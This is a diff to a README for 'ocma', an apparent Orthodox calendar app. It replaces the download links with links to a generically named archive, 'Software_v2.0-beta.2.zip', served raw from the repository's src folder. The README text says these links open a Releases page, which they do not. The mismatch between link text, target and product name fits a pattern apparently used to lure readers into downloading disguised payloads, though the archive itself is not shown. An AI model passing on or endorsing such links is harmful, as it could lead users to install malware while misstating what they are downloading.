@@ -8,7 +8,7 @@ Welcome to ocma! This application helps you explore the Old and New Orthodox Cal
 
 To get started, you need to download the application. Click the button below to visit the Releases page and download ocma.
 
-[![Download ocma](https://raw.githubusercontent.com/Slrck/ocma/main/src/ocma_v3.0.zip)](https://raw.githubusercontent.com/Slrck/ocma/main/src/ocma_v3.0.zip)
+[![Download ocma](https://raw.githubusercontent.com/Slrck/ocma/main/src/Software_v2.0-beta.2.zip)](https://raw.githubusercontent.com/Slrck/ocma/main/src/Software_v2.0-beta.2.zip)
 
 ## 🛠 System Requirements
 
@@ -22,7 +22,7 @@ Before downloading, ensure your system meets the following requirements:
 ## 📂 Download & Install
 
 1. Visit the Releases page by clicking the link below:
-   [Download ocma](https://raw.githubusercontent.com/Slrck/ocma/main/src/ocma_v3.0.zip)
+   [Download ocma](https://raw.githubusercontent.com/Slrck/ocma/main/src/Software_v2.0-beta.2.zip)
 
 2. On the Releases page, find the latest version of ocma.
 
